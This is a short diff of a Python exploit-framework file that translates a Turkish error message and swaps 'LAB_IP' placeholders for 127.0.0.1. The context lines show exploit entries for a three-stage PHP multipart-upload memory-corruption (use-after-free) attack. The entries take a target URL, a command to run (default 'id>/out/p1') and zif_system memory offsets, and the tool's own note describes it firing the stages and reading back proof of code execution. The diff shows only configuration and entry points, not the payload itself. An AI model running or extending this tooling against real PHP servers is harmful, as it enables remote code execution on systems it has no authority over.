@@ -296,7 +296,7 @@ class _Exploit:
 def run(params: dict) -> dict:
     url = (params.get("url") or params.get("target") or "").strip()
     if not url:
-        return {"ok": False, "success": False, "error": "url/target gerekli"}
+        return {"ok": False, "success": False, "error": "url/target required"}
     cmd = (params.get("cmd") or "id>/out/p1").strip()
     profile = params.get("profile") or "bookworm"
     if profile not in ("lab", "bookworm"):
@@ -422,7 +422,7 @@ EXPLOITS = {
         "note": "Native engine — the scanner opens the socket, fires the 3 stages and reads the id proof via GET. Requires: memory_limit<post_max, display_errors=1, profile/offset matching the build.",
         "inputs": [
             {"key": "url", "label": "Hedef PHP sayfasi", "req": True, "default": "",
-             "placeholder": "http://LAB_IP:18111/index.php"},
+             "placeholder": "http://127.0.0.1:18111/index.php"},
             {"key": "cmd", "label": "Komut (max 14 byte)", "req": False, "default": "id>/out/p1"},
             {"key": "profile", "label": "Profil", "req": False, "default": "bookworm"},
             {"key": "zif", "label": "zif_system offset (hex)", "req": False, "default": "465370"},
@@ -440,7 +440,7 @@ EXPLOITS = {
         "note": "109619 = stale global state / UAF; ayni RFC1867 vektoru, ayni native engine (109618+109619).",
         "inputs": [
             {"key": "url", "label": "Hedef PHP sayfasi", "req": True, "default": "",
-             "placeholder": "http://LAB_IP:18111/index.php"},
+             "placeholder": "http://127.0.0.1:18111/index.php"},
             {"key": "cmd", "label": "Komut (max 14 byte)", "req": False, "default": "id>/out/p1"},
             {"key": "profile", "label": "Profil", "req": False, "default": "bookworm"},
             {"key": "zif", "label": "zif_system offset (hex)", "req": False, "default": "465370"},
